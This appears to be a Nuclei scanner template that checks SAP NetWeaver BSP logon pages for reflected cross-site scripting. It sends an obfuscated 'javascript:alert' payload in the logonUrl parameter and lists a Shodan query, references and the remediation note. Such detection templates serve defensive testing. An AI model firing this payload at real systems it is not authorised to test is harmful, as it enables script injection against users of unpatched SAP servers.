http:
- host-redirects: true
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - javascrip&#x9;T&#x3a;alert&#x28;document.domain&#x29;
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 2
  method: GET
  path:
  - '{{BaseURL}}/sap(bD1ydSZjPTAwMA==)/public/bsp/sap/system_public/logon.htm?logonUrl=javascrip%09T:alert(document.domain)'
id: sap-gui-xss
info:
  author: haones, MrL872
  description: SAP NetWeaver BSP 620 to 730 versions suffer from a cross site scripting
    vulnerability via the logon page.
  metadata:
    max-request: 1
    shodan-query: title:"SAP"
    verified: true
  name: SAP NetWeaver BSP Logon Page Cross Site Scripting
  reference: http://dsecrg.com/pages/vul/show.php?id=310 http://www.sdn.sap.com/irj/sdn/index?rid=/webcontent/uuid/c05604f6-4eb3-2d10-eea7-ceb666083a6a
    https://service.sap.com/sap/support/notes/1450270
  remediation: Solution to this issue is given in the 1450270 security note.
  severity: high
  tags: SAP,BSP,xss
